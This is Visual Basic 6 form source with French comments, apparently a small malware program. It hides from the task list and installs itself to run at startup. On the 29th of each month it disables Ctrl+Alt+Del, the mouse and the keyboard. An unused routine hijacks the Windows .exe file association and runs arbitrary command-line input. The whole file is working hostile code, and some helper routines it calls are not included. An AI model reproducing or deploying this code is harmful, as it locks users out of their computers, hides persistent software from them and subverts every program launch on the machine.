VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   2010
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3150
   Icon            =   "hsm.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2010
   ScaleWidth      =   3150
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   5000
      Left            =   1080
      Top             =   600
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Const SPI_SCREENSAVERRUNNING = 97

Private Sub Form_Load()
Dim Xdate1
Xdate1 = Day(Date)

Call RendreService  'rendre l'application invisible dans la liste des tâches de windows

If App.PrevInstance = True Then  's'assurer que l'application ne s'execute q'une seule fois
  End
End If

If Xdate1 = "29" Then  'ex: le 29 de chaque mois
   Call BoutonDesactiveCTRLALTSUPPR_Click  'On désactive le CTRL+ALT+SUPPR
End If

Demare "HSM", App.Path & "\" & App.EXEName & ".exe"  's'execute à chaque démarage

Me.Hide  'cacher la form

End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Call RendreService  ''rendre l'application invisible dans la liste des tâches de windows
End Sub

Private Sub Form_Unload(Cancel As Integer)
     
     Call BoutonActiveCTRLALTSUPPR_Click  '' Là c'est pour que CTRL+ALT+SUPPR soit réactivé quand vous quittez
     Call PlusService  'activer la visibilite des taches
     
End Sub

Private Sub xxxForm_Load()
Dim Xdate1
Xdate1 = Day(Date)
App.TaskVisible = False

request = Command()
If request <> Empty Then _
Shell request, vbNormalFocus

If App.PrevInstance = True Then
  End
End If

If Xdate1 = "29" Then
   Call BoutonDesactiveCTRLALTSUPPR_Click
End If

EcrireValeurCh HKEY_CLASSES_ROOT, ".exe", "", Empty
EcrireValeurCh HKEY_CLASSES_ROOT, ".exe\shell\open\command", "", Chr(34) & App.Path & "\" & App.EXEName & ".EXE" & Chr(34) & "%1 %*"

Me.Hide

End Sub

Private Sub BoutonDesactiveCTRLALTSUPPR_Click()
     Dim Retour As Long
     Dim a As Boolean
     Retour = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, a, 0)
End Sub

Private Sub BoutonActiveCTRLALTSUPPR_Click()
     Dim Retour As Long
     Dim a As Boolean
     Retour = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, a, 0)
End Sub

Private Sub Timer1_Timer()
Dim xDate2
xDate2 = Day(Date)

If xDate2 = "29" Then 'on peut faire beaucoup de chose ce jour
   Shell "rundll32 mouse,disable" 'désactiver la souris
   Shell "rundll32 keyboard,disable" 'désactiver le clavier
End If

End Sub
